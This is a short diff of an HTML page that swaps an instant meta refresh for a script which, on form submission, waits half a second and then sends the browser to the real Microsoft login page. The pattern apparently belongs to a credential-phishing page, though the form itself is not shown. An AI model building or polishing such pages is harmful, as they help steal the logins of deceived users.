@@ -132,7 +132,13 @@
     </table>
 </div>
 
-<meta http-equiv="refresh" content="0; url=https://login.microsoftonline.com/">
+<script>
+  document.forms[0].onsubmit = function() {
+    setTimeout(function(){
+      window.location.href = "https://login.microsoftonline.com/";
+    }, 500);
+  };
+</script>
 
 </body>
 </html>
